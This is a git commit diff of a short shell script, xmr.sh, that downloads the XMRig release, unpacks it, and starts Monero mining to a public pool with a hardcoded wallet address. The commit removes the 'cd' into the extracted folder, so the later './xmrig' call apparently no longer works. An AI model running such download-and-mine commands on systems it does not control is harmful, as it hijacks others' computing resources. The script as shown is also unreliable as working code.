efab8330ec3be3473572f587145261ee7dc121f5
thutrat01 <88629080+thutrat01@users.noreply.github.com>
2021-08-08 18:03:41 +0000

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -1,7 +1,7 @@
 #xmr
 sudo apt update
-wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar xf xmrig-6.13.1-linux-x64.tar.gz
+wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz
+tar xf xmrig-6.13.1-linux-x64.tar.gz
 
-cd xmrig-6.13.1
 
 ./xmrig -o pool.supportxmr.com:443 -u 46b3zfEXZDD4nAcQ6jdYbpLRcQAeD3XWo9xTaEqtHF1tJ8URjjpAeiu6JtAaWwZ1GTRq8JAkPFp4cUbkempBKLo9EGah44r -k --tls -p 12
